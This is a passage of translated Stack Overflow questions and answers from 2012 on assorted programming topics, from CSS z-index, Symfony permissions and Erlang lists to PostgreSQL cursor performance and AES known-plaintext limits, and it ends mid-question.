> 标签：html, css, z-index

我试图将我的标题`<h1>`放在一个名为 div 的类上，该类`light`包含一个名为`light.png`. 我已经使用`Z-index`并添加了它们`position:relative`，但仍然`<h1>`没有放置`<div class=light>`。

我究竟做错了什么？这是我的**html代码**：

```
<body>
    <div class="light"></div>
    <h1>sdfdsf</h1>
</body> 
```

**CSS代码：**

```
body {
    background-image: url(images/bg.jpg);
    background-repeat: repeat;
    z-index:1;
}
.light {
    background-image: url(images/light.png);
    margin-left:auto;
    margin-right:auto;
    z-index:2;
    width:763px;
    height:566px;
    position:relative;
}
h1 {
    font-family: Georgia, "Times New Roman", Times, serif;
    font-size: 48px;
    color: rgba(255,255,255,1);
    position:relative;
    z-index:5;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:55:21.620

您所要做的就是将您的`<h1>`标签放在标签内`<div>`。

```
<div class="light">
    <h1>sdfdsf</h1>
</div> 
```

**现场示例：[Tinkerbin](http://tinkerbin.com/5Ixbodio)**
*我修改了您的背景颜色以显示示例*。

你不需要为此使用`z-index`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T16:58:20.133

这是我在评论中所说的示例：

**html代码：**

```
<body>
  <div class='outer'>
      <div class="light"></div>
      <h1>sdfdsf</h1>
  </div>
</body> 
```

**CSS代码：**

```
body {
   background-image: url(images/bg.jpg);
   background-repeat: repeat;
}

.outer{
   position:relative;
}
.light {
   background-image: url(images/light.png);
   margin-left:auto;
   margin-right:auto;
   width:763px;
   height:566px;
   position:absolute;
}
h1 {
   font-family: Georgia, "Times New Roman", Times, serif;
   font-size: 48px;
   color: rgba(255,255,255,1);
   position:absolute;
   z-index:99999999999;
   top:0;
   left:0;
} 
```

您可以使用所有 posiiton 亲戚，但由于`CSS`错误，它不完全兼容浏览器，所以我更喜欢这样做，因为这在旧浏览器上看起来也不错，而不仅仅是新浏览器。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-28T17:00:25.740

[小提琴](http://jsfiddle.net/dipaks2011/pW23Q/1/)

无需分配`z-index`给身体

HTML -

```
<div class="light"></div>
<h1>hi</h1>​ 
```

CSS -

```
.light {
    background-image: url(http://www.ostpl.com/Gallery/web-hosting.jpg);
    margin-left:auto;
    margin-right:auto;
    z-index:1;
    width:763px;
    height:566px;
    border: 1px solid #f00;
    position: relative;
}
h1 {
    font-family: Georgia, "Times New Roman", Times, serif;
    font-size: 48px;
    color: rgba(0,0,0,1);
    position:absolute;
    left: 0;
    top: 0;
    z-index:2;
}​ 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-28T16:55:29.610

把`<h1>`标签放在里面`div light`

```
 <body>
    <div class="light">
      <h1>sdfdsf</h1>
    </div>
</body> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-28T16:56:01.593

改用绝对

```
<style type="text/css" media="screen">
    body {
        background-color: black;
        background-repeat: repeat;
        z-index:1;
    }
    .light {
        background-color: yellow;
        margin-left:auto;
        margin-right:auto;
        z-index:2;
        width:763px;
        height:566px;
        position:absolute;
    }
    h1 {
        font-family: Georgia, "Times New Roman", Times, serif;
        font-size: 48px;
        color: rgba(255,255,255,1);
        position:absolute;
        z-index:5;
    }
</style> 
```

*   absolute ：元素相对于它的第一个定位（非静态）祖先元素定位
*   relative : 元素相对于它的正常位置定位，因此 "left:20" 将 20 像素添加到元素的 LEFT 位置

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-28T16:57:21.950

***见[演示](http://jsfiddle.net/uA4m5/2/)***

HTML：

```
<body>
  <div class="light"></div>
  <h1>sdfdsf</h1>
</body>​ 
```

CSS：

```
.light {
    position:relative;
    width: 300px;
    height: 100px;
    background: #ccc;
    z-index: 1;
}

h1 {
    position:relative;
    z-index: 2;
    top: -10px;
}​ 
```

更大的 z-index - 更高的元素。

# macos - 在 Mac OS X 的 Symfony 中使用应用程序/控制台

> ID：11702888
> 
> 赞同：2
> 
> 时间：2012-07-28T16:49:53.640
> 
> 标签：macos, console, symfony1, acl, chmod

我在 Mac Os X 上安装了 Symfony 并执行以下操作：

```
chmod -R 777 app/cache app/log 
```

尝试这样做：

```
php app/console cache:clear 
```

并返回错误：

```
[RuntimeException]                                                                        
Unable to write in the "/Users/anton/Sites/local/Symfony/app/cache/dev" directory 
```

尝试修复它！谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-28T20:48:25.597

如果您在 Mac 上，您可以使用[此处](http://symfony.com/doc/current/book/installation.html#configuration-and-setup)解释的 ACL 。从项目目录：

```
sudo chmod +a "_www allow delete,write,append,file_inherit,directory_inherit" app/cache app/logs
sudo chmod +a "whoami allow delete,write,append,file_inherit,directory_inherit" app/cache app/logs 
```

`_www`第一行是运行 Web 服务器的名称

您必须`whoami`在第二行中进行更改，因为您键入`php app/console cache:clear`. （通常是您的主文件夹的名称）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T17:14:01.873

显然您的网络服务器（apache？）已经在缓存文件夹中创建了一些文件或目录（因此它们归网络服务器用户所有，可能是 www-data）。在这种情况下，一个 chmod 是不够的，你必须执行一个 chown -R anton app/cache app/log。

为避免不同所有者拥有不同缓存文件的普遍问题，您的控制台用户和为 Web 服务器执行 php 的用户应该相同。有不同的方法可以实现这一点。你可以：

1.  更改您的 apache 配置，以便 apache 与您的用户 (anton) 一起运行，而不是 www-data
2.  删除 mod_php 并改用 php5-fpm （并将其配置为使用您的用户）
3.  使用 fast_cgi

# erlang - Erlang `now-next` 列表迭代

> ID：11702889
> 
> 赞同：1
> 
> 时间：2012-07-28T16:49:55.187
> 
> 标签：erlang

我正在尝试编写类似于以下内容的内容：

哈斯克尔：

```
Prelude> let xs = [1..10]
Prelude> zip xs (tail xs)
[(1,2),(2,3),(3,4),(4,5),(5,6),(6,7),(7,8),(8,9),(9,10)] 
```

二郎：

```
1> XS = [1,2,3,4,5,6,7,8,9,10].
[1,2,3,4,5,6,7,8,9,10]
2> lists:zip(XS, tl(XS)).
** exception error: no function clause matching lists:zip("\n",[]) (lists.erl, line 321)
     in function  lists:zip/2 (lists.erl, line 321)
     in call from lists:zip/2 (lists.erl, line 321)

now_nxt([X|Tail],XS) -> 
    [Y|_] = Tail,
    now_nxt(Tail, [{X,Y}|XS]);
now_nxt(_,XS) -> XS.

156>coeffs:now_nxt(XS, []).
** exception error: no match of right hand side value [] 
```

更新：

谢谢你的例子。我最终写了以下内容：

```
now_nxt_nth(Index, XS) ->
    nnn(Index, XS, []).

nnn(Index, XS, YS) ->
    case Index > length(XS) of
    true  ->
        lists:reverse(YS);
    false ->
        {Y,_} = lists:split(Index, XS),
        nnn(Index, tl(XS), [Y|YS])
    end. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T23:12:31.800

多种可能的一种（简单而有效的）解决方案：

```
now_nxt([H|T]) ->
  now_nxt(H, T).

now_nxt(_, []) -> [];
now_nxt(A, [B|T]) -> [{A, B} | now_nxt(B, T)]. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T17:58:11.683

使用 时，列表的大小必须相同`lists:zip`，tl(XS) 显然比 XS 短一个。

```
 lists:zip(XS--[lists:last(XS)], tl(XS)). 
```

我认为通过从第一个输入列表中删除最后一个元素来实现您想要做的事情。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T15:54:16.367

另一种解决方案是：

```
lists:zip(lists:sublist(XS,length(XS)-1), tl(XS)). 
```

应当指出的是

```
L--[lists:last(L)] 
```

可能不会删除最后一个元素。例如，

```
L = [1,2,3,4,1].
L -- [lists:last(L)] =/= [1,2,3,4]. % => true
[2,3,4,1] = L -- [lists:last(L)]. 
```

# computer-vision - 关于计算机视觉中的 splat 模糊和切片技术

> ID：11702894
> 
> 赞同：0
> 
> 时间：2012-07-28T16:50:39.833
> 
> 标签：computer-vision

我是计算机视觉的新手，正在努力理解用于加速高斯滤波技术的 splat、blur 和 slice 技术的概念。我一直在关注这篇论文 [http://books.google.com/books?id=ihe0nfm97eIC&printsec=frontcover&source=gbs_ge_summary_r&cad=0#v=onepage&q&f=false](http://books.google.com/books?id=ihe0nfm97eIC&printsec=frontcover&source=gbs_ge_summary_r&cad=0#v=onepage&q&f=false)。

但是，我是一个非常初学者。那么任何人都可以指出一些可以帮助我理解这种技术的基础知识吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T04:17:12.297

如果你需要从最基础的开始，有很多关于图像处理的很好的介绍性文本。我个人非常喜欢 Gonzalez-Wintz，但现在可能很难找到。[彼得鲁](https://rads.stackoverflow.com/amzn/click/com/047074586X)一号得到了很好的评价。

# python - 尝试使用 Blogger API 删除帖子会返回“未找到”错误

> ID：11702897
> 
> 赞同：5
> 
> 时间：2012-07-28T16:51:30.073
> 
> 标签：python, api, blogger

向 Blogger REST API (v3.0) 发送 DELETE 请求，我正在尝试使用[delete 方法](https://developers.google.com/blogger/docs/3.0/using#DeletingAPost)删除帖子。为此，我使用以下代码：

```
api_uri = 'https://www.googleapis.com/blogger/v3/blogs/%s/posts/%s' % (blogId, postId)
result = urlfetch.fetch(url=api_uri,
                  method=urlfetch.DELETE,
                  headers={'Authorization' : oauth_token})

self.response.out.write(result.content) 
```

但是服务器返回：

```
{
 "error": {
  "errors": [
   {
    "domain": "global",
    "reason": "notFound",
    "message": "Not Found"
   }
  ],
  "code": 404,
  "message": "Not Found"
 }
} 
```

但是，我可以使用以下代码检索有关此帖子的信息：

```
api_uri = 'https://www.googleapis.com/blogger/v3/blogs/%s/posts/%s' % (blogId, postId)
result = urlfetch.fetch(url=api_uri,
                  headers={'Authorization' : oauth_token})
self.response.out.write(result.content) 
```

此刻，我不明白我做错了什么——请求被授权，`blogId`并且`postId`是正确的——但无论如何，服务器返回“未找到”错误。

如果你知道如何解决这个问题或者你可以提供有用的建议——请帮助我。
感谢您抽出时间和考虑此事。

**UPD 1：**如果我向以下 URL 发送请求：

```
# https://www.googleapis.com/blogger/v3/users/{userID}
# https://www.googleapis.com/blogger/v3/users/self 
```

服务器还返回：

```
{
 "error": {
  "errors": [
   {
    "domain": "global",
    "reason": "notFound",
    "message": "Not Found"
   }
  ],
  "code": 404,
  "message": "Not Found"
 }
} 
```

**UPD 2：**我忘了说我正在使用[OAuth 2.0 for Server to Server Applications](https://developers.google.com/accounts/docs/OAuth2ServiceAccount)。`https://accounts.google.com/o/oauth2/token`因此，为了获取授权令牌，我使用以下 JWT 声明集发送请求：

```
jwt_claim_set = {
   'iss' : '{id}@developer.gserviceaccount.com',
   'scope' : 'https://www.googleapis.com/auth/blogger',
   'aud' : 'https://accounts.google.com/o/oauth2/token',
   'exp' : expire,
   'iat' : timestamp
} 
```

服务器返回：

```
{
  "access_token" : "1/8xbJqaOZXSUZbHLl5EOtu1pxz3fmmetKx9W8CV4t79M",
  "token_type" : "Bearer",
  "expires_in" : 3600
} 
```

并定义变量`oauth_token`，使用：

```
data = simplejson.loads(result.content)
oauth_token = data['token_type'] + ' ' + data['access_token'] 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T14:17:54.940

您确定您正确使用了 OAuth2 吗？在我看来，您没有正确登录，这就是您收到这些错误的原因。

使用 Google OAuh2 Playground (https://code.google.com/oauthplayground/) 尝试这些相同的查询，看看会发生什么。

# android - OpenGL ES 2.0 texture2D 偏差/lod

> ID：11702903
> 
> 赞同：7
> 
> 时间：2012-07-28T16:52:06.183
> 
> 标签：android, opengl-es-2.0, fragment-shader, mipmaps, level-of-detail

我正在使用 OpenGL ES 2.0 GLSL 功能来操作图像。我想要实现的是在从片段着色器中从纹理中获取样本时选择特定的细节级别（LOD）。显然`texture2DLod()`，OpenGL ES 2.0 中的片段着色器不支持（但有一个扩展[`GL_EXT_shader_texture_lod`](http://www.khronos.org/registry/gles/extensions/EXT/EXT_shader_texture_lod.txt)可以选择提供它。）

但是，默认`texture2D()`函数提供了第三个可选参数偏差。据我了解，此参数应该是添加到当前 LOD 的偏移量。

在我的测试中，我正在绘制屏幕大小的四边形，并通过缩放样本坐标来放大纹理。我使用 GL_LINEAR_MIPMAP_LINEAR 作为缩小过滤器为纹理启用了 mipmapping。在 ARM Mali-400 GPU 上使用非零偏差参数进行采样时的结果如下图所示。

ISTM 认为一些像素使用缩小过滤器，而其他像素使用放大过滤器。

这是如何控制的？使用偏差时如何确定初始 LOD？可以从顶点着色器调整吗？

一个相关的问题是以下问题：

[GLSL 采样器如何确定纹理的缩小以及 mipmap 级别？](https://stackoverflow.com/questions/7367606/how-does-a-glsl-sampler-determine-the-minification-and-thus-the-mipmap-level-o)

![在 ARM Mali-400 上带有偏差参数的 texture2D](../Images/b0ddad4e2f52b4b39032c34883aa2fd0.png)

更新：我注意到，如果我对纹理进行采样以使其覆盖屏幕，那么它似乎会进行正确的 mipmap 查找（即使它被放大了。）现在，如果我在样本坐标上添加一个小偏移量，那么我将开始看到上图中看到的条带（放大得更多。）如果我不使用偏差参数，我根本看不到任何条带。

# java - java自动发送邮件

> ID：11702917
> 
> 赞同：4
> 
> 时间：2012-07-28T16:54:11.807
> 
> 标签：java, email, sendmail

我希望邮件在特定时间自动发送。我可以发送邮件，但无法自动完成。谁能告诉我如何自动发送？以下是我发送邮件的代码：

```
public class SendEmail {

    String d_email = "sofien.fkih@gmail.com",
            d_password = "",
            d_host = "smtp.gmail.com",
            d_port = "465",
            m_to = "sofien.fkih@gmail.com",
            m_subject = "Testing",
            m_text = "Hey, this is the testing email.";

    // Those are the values that have the email information
    public void send(String from, String pass, String host, String port, String to, String subject, String text) {

        Properties props = new Properties();

        // Read properties file.

        props.put("mail.smtp.user", from);
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.socketFactory.port", port);
        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.socketFactory.fallback", "false");

        SecurityManager security = System.getSecurityManager();

        try {
            Authenticator auth = new SMTPAuthenticator();
            Session session = Session.getInstance(props, auth);
            MimeMessage msg = new MimeMessage(session);

            msg.setText(text);
            msg.setSubject(subject);
            msg.setFrom(new InternetAddress(from));
            msg.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
            Transport.send(msg);
        } catch (Exception mex) {
            mex.printStackTrace();
        }
    }

    public class SMTPAuthenticator extends javax.mail.Authenticator {

        public PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(d_email, d_password);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T17:05:47.807

看看`java.util.Timer`，如果你还不够了解[Quartz](http://quartz-scheduler.org/) - 纯 java cron 兼容调度程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T17:16:11.670

石英似乎是更好的选择。本[教程](http://www.mkyong.com/java/quartz-scheduler-example/)可能会帮助您设置石英。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-22T10:33:41.273

尝试

```
public class SendEmail extends TimerTask{

public static void main(String[] args){
Timer t = new Timer();
t.schedule(new SendEmail(), 0, 9000); //send email every 9 seconds
}

@Override
public void run() {
    // TODO Auto-generated method stub
    //Your email syntax here
} 
```

}

# c++ - 汇编代码是否试图到达相同的寄存器，在不同的线程中会损坏任何东西？

> ID：11702919
> 
> 赞同：1
> 
> 时间：2012-07-28T16:54:14.320
> 
> 标签：c++, multithreading, thread-safety, inline-assembly

在线程中使用 __asm{} 代码是否危险？

例如，我有 2 个线程在一个内核上运行，而 main() 在另一个内核上运行。如果一个线程在 eax 上写入并读取 ebx 而另一个线程在 eax 上写入并在 ebx 上写入会发生什么？如果我从 main() 读取这些寄存器会发生什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-28T16:56:51.790

每个线程都有自己维护的一组寄存器。要么是因为它在不同的内核上运行，要么是操作系统在上下文切换时换出了寄存器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T16:58:59.560

只有您的“全局”（非堆栈）变量在线程之间共享。

这**[已经在 SO 上讨论过了](https://stackoverflow.com/questions/3410778/how-does-a-computer-use-just-a-few-registers)**。

# php - 在 Drupal 中实现自定义模块

> ID：11702923
> 
> 赞同：0
> 
> 时间：2012-07-28T16:55:17.250
> 
> 标签：php, drupal, ubercart

我是 Drupal 的新手，我必须为 ubercart 编写一种新的自定义付款方式。我简要了解了 Drupal 的 hooks 系统。

在 ubercart api 文档中，[http](http://www.ubercart.org/docs/api/hook_payment_method) ://www.ubercart.org/docs/api/hook_payment_method ：

```
<?php
function uc_payment_payment_method() {
  $methods[] = array(
    'id' => 'check',
    'name' => t('Check'),
    'title' => t('Check or Money Order'),
    'desc' => t('Pay by mailing a check or money order.'),
    'callback' => 'uc_payment_method_check',
    'weight' => 1,
    'checkout' => TRUE,
  );
  return $methods;
}
?> 
```

但是，当我查看 paypal 模块的实现方式时：

```
$methods[] = array(
    'id' => 'paypal_wps',
    'name' => t('PayPal Website Payments Standard'),
    'title' => $title1 . $title2,
    'review' => t('PayPal'),
    'desc' => t('Redirect users to submit payments through PayPal.'),
    'callback' => 'uc_payment_method_paypal_wps',
    'redirect' => 'uc_paypal_wps_form',
    'weight' => 1,
    'checkout' => FALSE,
    'no_gateway' => TRUE,
  ); 
```

有一些特殊的字段，例如redirect 和no_gateway。我在哪里可以找到这些字段的文档以查看这些字段的实际作用？

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T18:11:47.787

您还可以在[http://api.ubercart.me/](http://api.ubercart.me/)查看 Ubercart API 文档。

但是我看到，[`hook_uc_payment_method()`](http://api.ubercart.me/api/drupal/ubercart!payment!uc_payment!uc_payment.api.php/function/hook_uc_payment_method/7)这里没有比您提到的文档更多的信息。

以 PayPal 支付模块为例，我发现重定向回调指定了重定向到场外支付网关的最终结帐按钮背后的代码。

所以这`uc_paypal_wps_form`是最终结帐按钮后面生成的表单。如果您使用 Firebug 检查呈现的结帐按钮元素，您将看到此函数生成的表单。

我还在我的博客上发布了一个示例，网址为[http://nmc-codes.blogspot.ca/2012/07/how-to-create-custom-ubercart-payment.html](http://nmc-codes.blogspot.ca/2012/07/how-to-create-custom-ubercart-payment.html)

至于`no_gateway`选项，这是我可以在 ubercart 模块中找到的唯一一段引用它的代码：

```
if (empty($method['no_gateway'])) {
  $gateways = _uc_payment_gateway_list($id, TRUE);
  $options = array();
  foreach ($gateways as $gateway_id => $gateway) {
    $options[$gateway_id] = $gateway['title'];
  }
  if ($options) {
    $form['pmtable'][$id]['uc_payment_method_' . $id . '_checkout']['#title'] .= ' (' . t('includes %gateways', array('%gateways' => implode(', ', $options))) . ')';
  }
} 
```

当您在付款方式的管理列表中查看它时，它似乎并没有做太多，但添加到付款方式的标签/标题中`admin/store/settings/payment`

# sql - 在一定数量的记录后，Postgres 服务器性能下降

> ID：11702930
> 
> 赞同：3
> 
> 时间：2012-07-28T16:55:28.593
> 
> 标签：sql, performance, postgresql, cursor

我正在使用游标从大型 postgres 表中检索记录。（4亿条记录，使用子表对数据进行分区。）我的游标定义为：

```
select * from parent_table order by indexed_column 
```

同时使用 JDBC 和 psql，前几十万次检索的性能是一致的。之后，它从悬崖上掉下来，再也没有恢复过来。在服务器上 CPU、内存和磁盘活动相当均匀；即，没有任何基于系统的东西是明显的罪魁祸首。我最初怀疑这可能是网络问题，但我已经从不同的网络复制了这个问题。

这是 psql：

```
db@dbdev> fetch 100000 from all_persons;
Time: 13995.910 ms
db@dbdev> fetch 100000 from all_persons;
Time: 13852.955 ms
db@dbdev> fetch 100000 from all_persons;
Time: 14037.631 ms
db@dbdev> fetch 100000 from all_persons;
Time: 13818.516 ms
db@dbdev> fetch 100000 from all_persons;
Time: 13952.260 ms
db@dbdev> fetch 100000 from all_persons;
Time: 14257.836 ms
db@dbdev> fetch 100000 from all_persons;
Time: 14115.941 ms
db@dbdev> fetch 100000 from all_persons;
Time: 14375.485 ms
db@dbdev> fetch 100000 from all_persons;
Time: 14898.741 ms
db@dbdev> fetch 100000 from all_persons;
Time: 14086.004 ms
db@dbdev> fetch 100000 from all_persons;
Time: 59841.556 ms
db@dbdev> fetch 100000 from all_persons;
Time: 198176.211 ms
db@dbdev> fetch 100000 from all_persons;
Time: 162593.582 ms 
```

这是 JDBC（一次检索 10000 个；左边的数字是插入回的已过滤记录集的计数）：

```
...
536040 retrieve in 405; filtering in 28; insert in 1734
544739 retrieve in 413; filtering in 27; insert in 1713
553574 retrieve in 382; filtering in 27; insert in 1761
563167 retrieve in 348; filtering in 28; insert in 2019
572723 retrieve in 363; filtering in 27; insert in 2048
581736 retrieve in 363; filtering in 28; insert in 1784
591131 retrieve in 480; filtering in 28; insert in 1869
600260 retrieve in 377; filtering in 27; insert in 1831
608234 retrieve in 24074; filtering in 27; insert in 1566
616212 retrieve in 23711; filtering in 27; insert in 1649
624449 retrieve in 25913; filtering in 27; insert in 1587
632528 retrieve in 29981; filtering in 27; insert in 1527
641334 retrieve in 23231; filtering in 27; insert in 1728
650427 retrieve in 27883; filtering in 27; insert in 1996
659516 retrieve in 34422; filtering in 27; insert in 1774 
```

虽然 psql 性能似乎越来越差，但 JDBC 性能至少在一百万条记录中保持大致一致（在大约 34k 和 17k 毫秒之间波动）。

性能突然下降的原因是什么？

### （编辑）工作解决方案：

我通过将批处理大小（检索/插入）降低到 5000 并按顺序对每个子表（而不是父表）运行游标来解决这个问题。我还从光标中删除了 order by，因为这似乎有帮助，即使 order by 是针对有序索引的。

我的猜测是，这给了 postgres 一次加载完整分区的最佳机会。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T17:07:39.833

我对性能的猜测如下。

您在 "indexed_column" 上有一个索引。. . 这只是猜测（基于名称）。Postgres 使用索引列进行排序。此外，该表是增量创建的，因此该表的前一百万行左右都在数据库中的一组连续页面上。

如果这是真的，那么正在发生以下情况。排序很高兴进入索引并找到它需要的记录。如果页面不存在，它将页面加载到内存中。在几乎所有情况下——对于前一百万左右的行——页面都在那里，并且结果很快就会返回。

然而，在那之后，发生了一些不好的事情。索引指定了一行，而该行所在的页面可能不在内存中。因此，它必须去获取页面，经常替换（刷新）缓存中已经存在的页面。也就是说，每个行引用基本上都需要一个磁盘 I/O。

顺便说一句，这种情况可能发生在任何表上，即使是不是以特定方式创建的表。但是，获得一百万行是在填充缓存之前要取出很多行，除非它们是有序的。

现在，你怎么能解决这个问题。最好的办法就是把过滤逻辑放到数据库里，放在它所属的地方。毕竟，将数亿行返回给应用程序并不是对数据库的良好使用。那是我要看的第一个地方。

您可以做一些激烈的事情，看看是否删除索引并为 order by 进行实际排序是否更快。如果上面的描述是正确的，那么它会更快——但需要注意的是你会为第一行等待很长时间。

您可以做的一件事是重新创建表，按索引列对数据进行排序，然后重新编制索引（即将列变为聚集索引）。这将在未来有所改善，但这个过程需要一些时间。

另外两个可能的尝试。假设您只需要表中的一部分列，创建一个临时表，然后从那里提取数据。对于 4 亿条记录，这将需要一段时间，但是，如果所需的字段相对于原始记录而言较小，则会提高性能。

其次，如果您不需要按特定顺序排列的数据，那么只需按顺序提取记录即可。这应该将索引扫描替换为全表扫描，从而消除页面抖动。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T02:47:46.223

我支持 Gordon 的观点，并将添加我自己的缓存未命中经验。基本上发生的情况是，缓存中的数据最终会在某个时间点到期，并且突然之间会有大量的磁盘 I/O。

我为客户做了一个批量支付存储过程，对于小批量支付，它运行良好，但对于大批量支付，它会窒息。经过一些测试，我们注意到以下几点：

当支付多达几百张发票时，它的表现会非常好。为供应商支付 200-500 张发票时，它会开始放缓，而为供应商支付 1000 或更多发票时，它似乎会挂起。我与一位 PostgreSQL 专家交谈，他查看了代码并立即建议缓存未命中。考虑到这一点，我们重写了代码，性能变得可以接受。

在您的情况下，我建议您准确地从应用程序的角度确定需要检索的内容，并编写查询以在该查询中尽可能多地执行。我不知道你在做什么，所以我不知道排序是否足够。但是，我已经看到 HAVING 子句解决了此类性能问题，因此值得关注的不仅是排序，还有聚合，以及初始查询是否以任何方式结合了读取和写入（例如通过字段列表中的函数调用）。这始终是性能杀手，并且会使缓存未命中异常痛苦（这实际上是我上面提到的学习经验中的一个主要问题）。

一般来说，我对 PostgreSQL 的经验是，当您准确地获得应用程序所需的信息时，您的性能总是最好的，并且尽可能多的设置处理逻辑被推送到数据库中。

# pmd - 如何在 linux 的命令行上运行 PMD

> ID：11702934
> 
> 赞同：2
> 
> 时间：2012-07-28T16:55:48.850
> 
> 标签：pmd

我试过

```
$java -jar ../lib/pmd-5.0.0.jar /var/lib/jenkins/jobs/MYPROJECT/workspace/ xml 
```

错误：无法从 ../lib/pmd-5.0.0.jar 加载主类清单属性

根据[PMD的文档](http://pmd.sourceforge.net/pmd-5.0.0/running.html)

我也试过：

```
$java -jar ../lib/pmd-5.0.0.jar /var/lib/jenkins/jobs/MYPROJECT/workspace/ xml java-basic,java-design -encoding UTF-8
Failed to load Main-Class manifest attribute from
../lib/pmd-5.0.0.jar 
```

通过使用以下语法解决了它：

```
cd ../pmd/bin
./run.sh pmd  /var/lib/jenkins/workspace/MYPROJECT/ xml java-basic,java-design -encoding UTF-8 | tee ../../MYPROJECT/pmd.xml 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T20:16:15.687

[您在链接到的文档](http://pmd.sourceforge.net/pmd-5.0.0/running.html)中在哪里看到？

我在该页面上看到的所有示例都说使用 PMD 类名而不是使用 -jar 标志运行 java。（这是我在运行 PMD 时使用的）

这给了你类似的东西：java net.sourceforge.pmd.PMD /var/lib/jenkins/jobs/MYPROJECT/workspace/xml rulesets/java/imports.xml

# wpf - 在 XAML 中的子小部件文本框上设置焦点

> ID：11702935
> 
> 赞同：0
> 
> 时间：2012-07-28T16:55:50.657
> 
> 标签：wpf, xaml, textbox, focus

如何将默认焦点设置在当前视图中的子小部件 TextBox 上？

```
<StackPanel Orientation="Vertical" FocusManager.FocusedElement="{Binding ElementName=SomeWidget.UnderTextBoxName}">
   <MyWidget x:Name="SomeWidget" Text="A" />
   <TextBox x:Name="TxtB" Text="B" />
</StackPanel> 
```

...认为这可能有效，但没有运气？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T17:42:58.547

使用`FocusedElement="{x:Reference Name=UnderTextBoxName}"`. 无需绑定。

```
<StackPanel Orientation="Vertical" >
        <MyWidget x:Name="SomeWidget" Text="A" FocusManager.FocusedElement="{x:Reference Name=UnderTextBoxName}"/>
        <TextBox x:Name="TxtB" Text="B" />
</StackPanel> 
```

我希望这将有所帮助。

# encryption - 当我有 IV、纯文本和加密文本时获取 AES CBC 密钥

> ID：11702936
> 
> 赞同：3
> 
> 时间：2012-07-28T16:55:56.253
> 
> 标签：encryption, cryptography, aes

我正在寻找一种从这组信息中获取密钥的方法，我知道我们正在使用 CBC 的 16 字节块，并且我有前 16 字节的明文和密码，以及使用的 IV。

目前，我可以通过比较输出来测试密钥是否正确，但由于显而易见的原因，我无法强制使用 16 个字符的密钥，阅读其他帖子我的理解是，拥有我拥有的数据可能会获得密钥。

有什么提示吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-28T17:13:10.983

您正在尝试做的事情称为“已知的明文攻击”，您拥有密文和明文，所缺少的只是使用的密钥。不幸的是，所有现代密码都旨在抵抗此类攻击。除非您具有极其复杂的数学技能，否则您将无法通过这种方式找到钥匙。AES 可以抵抗已知的明文攻击。

您将不得不尝试其他确定密钥的方法。钥匙的主人有没有把它写在纸上的某个地方？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T22:41:28.150

请注意，如果已按应有的方式应用了 AES，那么您将找不到密钥。但是，根据 stackoverflow 上错误实现的数量来判断，密钥也可能是密码或字符串的简单 SHA-256。如果您可以获得有关如何生成/应用或存储密钥的信息，您甚至可以绕过 AES-256。

否则，您唯一的攻击向量是破坏 AES 或暴力破解密钥。在这种情况下，我祝你好运，因为暴力破解 256 位密钥是完全不可能的，即使使用量子计算机也是如此。当然，除非发现漏洞，否则 AES终究*无法证明是安全的。**可能*存在漏洞。

# iphone - Objective-c 数组学习

> ID：11702940
> 
> 赞同：-1
> 
> 时间：2012-07-28T16:56:22.560
> 
> 标签：iphone, objective-c

好的，我正在学习数组以及如何像以前一样使用它们......（曾经做过很多脚本，但现在我正在尝试学习开发 ipad 和 iphone 应用程序

但我的问题是我有它，它使用 for 循环从雅虎金融中提取大量数据。

但是现在我的问题是如何只使用已提取的数组数据的一部分

这是我的例子

```
-(IBAction) clicked:(id)sender {

   NSString * StockOneYahooFinance = [NSString stringWithFormat:@"http://finance.yahoo.com/q/hp?s=S+Historical+Prices"];
   NSString * PulledStockOne = [NSString stringWithContentsOfURL:[NSURL URLWithString:StockOneYahooFinance] encoding:1 error:nil];

   for (i=1;i<=10;i++){

      NSString *StartPulling = [[PulledStockOne componentsSeparatedByString:@"nowrap align="] objectAtIndex:i];

      NSString *StartOpen = [[StartPulling componentsSeparatedByString:@">"] objectAtIndex:3];
      NSString *Open = [[StartOpen componentsSeparatedByString:@"<"] objectAtIndex:0];

      NSString *StartClose = [[StartPulling componentsSeparatedByString:@">"] objectAtIndex:9];
      NSString *Close = [[StartClose componentsSeparatedByString:@"<"] objectAtIndex:0];

      NSMutableArray *StockOpens = [[NSMutableArray alloc] initWithCapacity:6];
      [StockOpens addObject:Open];

      sixtyday.text = [OpenValues objectAtIndex:10];
      nintyday.text = [CloseValues objectAtIndex:10];

      if ([OpenValues objectAtIndex:10]=[OpenValues objectAtIndex:11] {
         sevenday.text = @"Plus One";
      } 
   }
} 
```

但现在我想做类似的事情

```
